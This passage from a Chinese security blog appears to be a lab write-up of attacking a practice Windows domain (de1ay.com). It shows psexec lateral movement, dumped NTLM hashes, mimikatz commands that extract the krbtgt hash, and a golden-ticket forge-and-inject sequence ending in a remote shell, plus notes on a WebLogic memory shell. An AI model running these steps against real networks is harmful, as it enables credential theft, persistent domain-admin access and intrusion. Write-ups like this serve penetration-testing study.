+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684253983202-f742f011-8077-40d3-a9fd-c027ee45e0bc.png#averageHue=%2318191b&clientId=uf01e4eae-ddaf-4&from=paste&height=1070&id=u17a9b065&originHeight=1070&originWidth=1970&originalType=binary&ratio=2&rotation=0&showTitle=false&size=252815&status=done&style=none&taskId=u7018765a-422e-4449-9916-57131b4ea53&title=&width=1970" alt="image.png"><br>结果全是超时，存在防火墙啊<br>使用CS的psexec <br>创建 SMB监听<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684255159188-7c8d3add-261e-4f2b-8a8b-41d351ff4f41.png#averageHue=%23e8ecf3&clientId=uf01e4eae-ddaf-4&from=paste&height=747&id=u1d8d4fa4&originHeight=747&originWidth=1033&originalType=binary&ratio=2&rotation=0&showTitle=false&size=34731&status=done&style=none&taskId=u006baca2-40b7-495b-82de-3ecfb3d1010&title=&width=1033" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684255247348-c7449555-3784-43ed-ba3e-83e222288d3a.png#averageHue=%23e7ecf3&clientId=uf01e4eae-ddaf-4&from=paste&height=1015&id=ud78c163c&originHeight=1015&originWidth=1750&originalType=binary&ratio=2&rotation=0&showTitle=false&size=43028&status=done&style=none&taskId=uf6fd9d5a-12eb-48d9-8fa8-182b84ceff6&title=&width=1750" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684255278219-ee8fda33-11ed-43cb-9985-be4794e42d10.png#averageHue=%23e7ebf3&clientId=uf01e4eae-ddaf-4&from=paste&height=572&id=ub755a2c1&originHeight=572&originWidth=1093&originalType=binary&ratio=2&rotation=0&showTitle=false&size=41522&status=done&style=none&taskId=u16ebbd2d-478c-4e25-adf3-9baf39d3f55&title=&width=1093" alt="image.png"><br>成功获取到shell <br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684255425684-c8536f70-b86f-47cb-b7be-3554819e0633.png#averageHue=%230c0a0a&clientId=uf01e4eae-ddaf-4&from=paste&height=1388&id=u0da6f4d5&originHeight=1388&originWidth=1413&originalType=binary&ratio=2&rotation=0&showTitle=false&size=139861&status=done&style=none&taskId=u0baf8f0e-53b5-4bd0-a1bd-c898f6843f4&title=&width=1413" alt="image.png"><br>SYSTEM权限</p>
+<p><a name="hIxpy"></a></p>
+<h1><span id="黄金票据">黄金票据</span></h1><p>黄金票据是伪造票据授予票据(TGT),也被称为认证票据,TGT仅用于向域服务器上的密钥分配中心(KDC)证明用户已经被其他的域控制器认证<br>黄金票据的条件</p>
+<ol>
+<li>域名城</li>
+<li>域的sid值</li>
+<li>域的krbtgt账户htlm密码哈希</li>
+<li>伪造用户名</li>
+</ol>
+<p>黄金票据可以在拥有普通域用户权限和krbtgt账户的hash的情况下用来获取域管理员权限,上面已经获取了域控的system权限了,还可以使用黄金票据做权限维持,当域控制器权限掉了之后,在通过域内其他任意机器伪造票据重新获取最高权限</p>
+<p>首先抓取krbtgt用户的Hash值并获取域sid</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">hashdump<br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684287926177-37feb4fe-0728-4033-b5dd-683986f85e48.png#averageHue=%230a0806&clientId=uf01e4eae-ddaf-4&from=paste&height=406&id=u658614d3&originHeight=406&originWidth=1107&originalType=binary&ratio=2&rotation=0&showTitle=false&size=56063&status=done&style=none&taskId=u1e5e7178-7f5d-4e14-a37a-7bc2a289a85&title=&width=1107" alt="image.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">Administrator:<span class="hljs-number">500</span>:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::<br>Guest:<span class="hljs-number">501</span>:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>krbtgt:<span class="hljs-number">502</span>:aad3b435b51404eeaad3b435b51404ee:82dfc71b72a11ef37d663047bc2088fb:::<br>de1ay:<span class="hljs-number">1001</span>:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::<br>mssql:<span class="hljs-number">2103</span>:aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24:::<br>DC$:<span class="hljs-number">1002</span>:aad3b435b51404eeaad3b435b51404ee:a3e8703c012b09dec6b81745e03d335d:::<br>PC$:<span class="hljs-number">1105</span>:aad3b435b51404eeaad3b435b51404ee:936b1a016012e78dfe4214e993402399:::<br>WEB$:<span class="hljs-number">1603</span>:aad3b435b51404eeaad3b435b51404ee:cdf7ecbd5506727d008792636adad3c4:::<br></code></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">logonpasswords<br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684288333569-f5c136c5-230d-464c-979d-46d5d64ac5fd.png#clientId=uf01e4eae-ddaf-4&from=paste&height=1005&id=ua8db64c4&originHeight=1005&originWidth=1786&originalType=binary&ratio=2&rotation=0&showTitle=false&size=103334&status=done&style=none&taskId=ue6cf3eee-b54a-4182-a11d-c0003bf9fdd&title=&width=1786" alt="image.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">privilege::debug<br>lsadump::lsa /patch        // 专用于在域控制器上导出用户密码或<span class="hljs-built_in">hash</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684293109965-344aea49-4b79-44b4-8121-cdcb0f36c128.png#averageHue=%23060606&clientId=uf01e4eae-ddaf-4&from=paste&height=961&id=uaed1d8d2&originHeight=961&originWidth=1476&originalType=binary&ratio=2&rotation=0&showTitle=false&size=54009&status=done&style=none&taskId=u25fe6d02-864e-491d-80f9-2f34136e2cd&title=&width=1476" alt="image.png"><br>获的的数据</p>
+<table>
+<thead>
+<tr>
+<th>用户</th>
+<th>de1ay</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>域名</td>
+<td>de1ay.com</td>
+</tr>
+<tr>
+<td>域SID</td>
+<td>S-1-5-21-2756371121-2868759905-3853650604</td>
+</tr>
+<tr>
+<td>域的krbtgt账户htlm密码哈希</td>
+<td>82dfc71b72a11ef37d663047bc2088fb</td>
+</tr>
+</tbody></table>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684294443659-3c9d7169-6ed4-4153-9450-9f12e6d6b004.png#averageHue=%23d0dfb5&clientId=uf01e4eae-ddaf-4&from=paste&height=262&id=u679d2041&originHeight=262&originWidth=398&originalType=binary&ratio=2&rotation=0&showTitle=false&size=18176&status=done&style=none&taskId=u9aa3b6af-5e82-4a5e-917c-577cc986e3a&title=&width=398" alt="image.png"><br>生成前先清空票据</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">kerberos::purge   //清空所有票据<br></code></pre></td></tr></table></figure>
+<p>手动创建票据</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># kerberos::golden /user:需要伪造的域管理员用户名 /domain:demo.com /sid:域sid /krbtgt: krbtgt用户的Hash /ticket:ticket.kirbi</span><br><br>kerberos::golden /user:administrator /domain:de1ay.com /sid:S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">2756371121</span>-<span class="hljs-number">2868759905</span>-<span class="hljs-number">3853650604</span> /krbtgt:82dfc71b72a11ef37d663047bc2088fb /ticket:ticket.kirbi<br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684289917109-f02cdab9-619c-402d-a10c-2ac23b5a0998.png#averageHue=%23030201&clientId=uf01e4eae-ddaf-4&from=paste&height=434&id=u1735a079&originHeight=434&originWidth=2012&originalType=binary&ratio=2&rotation=0&showTitle=false&size=44564&status=done&style=none&taskId=u2b4982b3-edcf-43c6-b6f0-f5b1d423988&title=&width=2012" alt="image.png"><br>生成TGT凭证ticket.kirbi成功，名为ticket.kirbi，然后再在mimikatz中将凭证ticket.kirbi注入进去：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">kerberos::ptt ticket.kirbi<br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684293762666-180603d1-83c6-40a9-a1fe-dc8bb5c1eb42.png#averageHue=%2317181a&clientId=uf01e4eae-ddaf-4&from=paste&height=151&id=ufde21c08&originHeight=151&originWidth=770&originalType=binary&ratio=2&rotation=0&showTitle=false&size=10381&status=done&style=none&taskId=u35224ced-075f-4bf1-bc9e-be7df23ac6a&title=&width=770" alt="image.png"><br>导入之后就可以使用IPC，Psexec 获取shell<br>PsExec 上传：<a target="_blank" rel="noopener" href="https://github.com/EliteLoser/Invoke-PsExec">https://github.com/EliteLoser/Invoke-PsExec</a><br>github地址: </p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">PsExec.exe \\<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.10</span> cmd.exe<br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684294295343-7903287d-1866-4d3c-a8f0-da73275d78c1.png#averageHue=%23090909&clientId=uf01e4eae-ddaf-4&from=paste&height=501&id=u37185dae&originHeight=501&originWidth=589&originalType=binary&ratio=2&rotation=0&showTitle=false&size=15075&status=done&style=none&taskId=uab6043d6-6aa4-4119-9e02-21724cf3f26&title=&width=589" alt="image.png"><br>使用dir <br>一开始使用域名不知道为什么有问题一直不行，使用msf里面的shell的时候好像使用psexec 不行。。。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/22356351/1684294354295-9f20ddb3-2f8e-4a4a-befd-b6009eeb1f15.png#averageHue=%2318191b&clientId=uf01e4eae-ddaf-4&from=paste&height=630&id=uadaf8cf0&originHeight=630&originWidth=1099&originalType=binary&ratio=2&rotation=0&showTitle=false&size=90460&status=done&style=none&taskId=u214897c7-33f7-4b15-8022-b8ef430f3d1&title=&width=1099" alt="image.png"></p>
+<p>&#x2F;&#x2F;&#x2F; 总结 ：<br>外网打点 ，weblogic 虽然是使用自动化工具，写上去内存马了，但是不知道这个weblogic的绝对地址 ，<br>百度得知，weblogic写shell 一般是写在war ，或者 image 下的<br>贴个靶机的绝对路径C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp_WL_internal\bea_wls_internal\9j4dqk\war&gt; <br>这是连接内存马的地址<br><a target="_blank" rel="noopener" href="http://192.168.145.150:7001/bea_wls_internal/index.html?size=1">http://192.168.145.150:7001/bea_wls_internal/index.html?size=1</a><br>如果是administrator权限的话，是可能可以getsystem 或者查看是否存在system权限的 进程，进行迁移提权的 <br>，虽然我不会免杀，但是这个 360 好像用处不大，倒是这个防火墙有点难搞有时候，连接上了很爱断开连接，而且可以使用MS17010打PC，但是因为防火墙打不了。<br>认识到了DCOM 方法去执行命令，弹shell ，但是不知道我这里为啥行不通 ，没找到原因。。。<br>对票据还是不太收悉，要加强多看看 多练练啊 ，权限维持不太会。</p>
+
+      </div>
+    </div>
+  </article>
+  <div class="post__foot">
+    
+    <div class="post-nav">
+  
+    <a class="post-nav-item-left" href="/2023/05/22/Vikings/">
+      <div class="text-align">
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+        <span class="text-small">上一篇</span>
+      </div>
+      <div>Vikings</div>
+    </a>
+  
+  <div class="vhr"></div>
+  
+    <a class="post-nav-item-right" href="/2023/05/15/SPP%20%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%20-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/">
+      <div class="text-align">
+        <span class="text-small">下一篇</span>
+        <svg t="1670570876164"
+             class="icon"
+             viewBox="0 0 1024 1024"
+             transform="scale(-1,-1)"
+             width="16"
+             height="16">
+          <path d="M384 512L731.733333 202.666667c17.066667-14.933333 19.2-42.666667 4.266667-59.733334-14.933333-17.066667-42.666667-19.2-59.733333-4.266666l-384 341.333333c-10.666667 8.533333-14.933333 19.2-14.933334 32s4.266667 23.466667 14.933334 32l384 341.333333c8.533333 6.4 19.2 10.666667 27.733333 10.666667 12.8 0 23.466667-4.266667 32-14.933333 14.933333-17.066667 14.933333-44.8-4.266667-59.733334L384 512z" p-id="14596"/>
+        </svg>
+      </div>
+      SPP端口转发-反向代理
+    </a>
+  
+</div>
+
+    
+      <div class="related-post">
+  <div class="related__head">
+  <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="post-tag">#内网渗透</a><a href="/tags/ATT-CK/" class="post-tag">#ATT&CK</a><a href="/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" class="post-tag">#权限维持</a><a href="/tags/Venom/" class="post-tag">#Venom</a>
+
+</div>
+  <div class="realated__body">
+    
+      DEBUG: 请安装插件 <a target="_blank" rel="noopener" href="https://github.com/tea3/hexo-related-popular-posts">hexo-related-popular-posts</a> 或关闭 related_post 配置!
+    
+  </div>
+</div>
+
+    
+    
+  </div>
+
+    </div>
+    <div class="foot">
+      <div class="foot-inner">
+        <div class="foot__head">
+          
+            <div class="foot-line">
+              
+                <div class="matts">浮</div>
+              
+                <div class="matts">云</div>
+              
+                <div class="matts">游</div>
+              
+                <div class="matts">子</div>
+              
+                <div class="matts">意</div>
+              
+            </div>
+          
+            <div class="foot-line">
+              
+                <div class="matts">落</div>
+              
+                <div class="matts">日</div>
+              
+                <div class="matts">故</div>
+              
+                <div class="matts">人</div>
+              
+                <div class="matts">情</div>
+              
+            </div>
+          
+        </div>
+        <div class="foot__body">
+          
+          
+            <div class="foot-item">
+              <div class="foot-item__head">账号</div>
+              <div class="foot-item__body">
+                
+                  <div class="text">
+                    <img alt="link" height="20px" width="20px" src="/images/logo-github.svg"/>
+                    <a class="foot-link" target="_blank" rel="noopener" href="https://github.com/x0blank">github</a>
+                  </div>
+                
+              </div>
+            </div>
+          
+          <div class="foot-item">
+            <div class="foot-item__head">联系</div>
+            <div class="foot-item__body">
+              <div class="text">
+                <img alt="link" height="20px" width="20px" src="/images/icon/icon-email.svg"/>
+                <a class="foot-link" href="mailto:chenxiaolong592@gmail.com">chenxiaolong592@gmail.com</a>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="copyright">
+          <a href="http://example.com">Blanks'Blog</a> &nbsp;|&nbsp;由&nbsp;<a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>&nbsp;及&nbsp;
+          <svg width="20" height="20" viewBox="0 0 725 725">
+            <path fill-rule="evenodd" fill="rgb(221, 221, 221)" d="M145.870,236.632 L396.955,103.578 L431.292,419.44 L156.600,522.53 L145.870,236.632 Z"/>
+            <path fill-rule="evenodd" fill="rgb(159, 159, 159)" d="M396.955,103.578 L564.345,234.486 L611.558,513.469 L431.292,419.44 L396.955,103.578 Z"/>
+            <path fill-rule="evenodd" fill="rgb(0, 0, 0)" d="M431.292,419.44 L611.558,513.469 L358.327,595.18 L156.600,522.53 L431.292,419.44 Z"/>
+          </svg>
+          <a target="_blank" rel="noopener" href="https://github.com/hooozen/hexo-theme-tranquility">致远</a>&nbsp;驱动
+        </div>
+      </div>
+    </div>
+    
+    
+  
+
+  </body>
+</html>
